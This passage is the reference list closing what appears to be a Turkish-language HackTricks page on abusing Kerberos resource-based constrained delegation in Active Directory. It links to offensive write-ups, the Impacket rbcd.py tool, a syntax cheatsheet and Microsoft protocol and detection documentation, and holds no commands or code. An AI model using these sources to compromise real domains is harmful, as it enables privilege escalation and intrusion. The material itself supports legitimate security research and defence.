- [3] [Kerberos Resource-based Constrained Delegation: Computer Object'ın Ele Geçirilmesi](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation'ın Kötüye Kullanılması](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Domain'i Öldürdü: Offensive Kerberos'a Genel Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (resmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Güncel sözdizimini içeren kısa Linux cheatsheet'i](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing kapalı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Cross-domain ve cross-forest RBCD'yi inceleme](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Cross-domain ve cross-forest RBCD'yi inceleme: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch'i - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy ayrıntıları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Normal bir kullanıcı hesabıyla RBCD'yi istismar etme](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - SPN'siz hesaplara karşı Protocol Transition olmadan Constrained Delegation'ı kötüye kullanma](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - SPN'siz hesaplara karşı Protocol Transition olmadan Constrained Delegation'ı kötüye kullanma](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - U2U ile S4U2Proxy](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - ServicesAllowedToSendForwardedTicketsTo kullanımı](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Kerberos event logging'i etkinleştirme](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
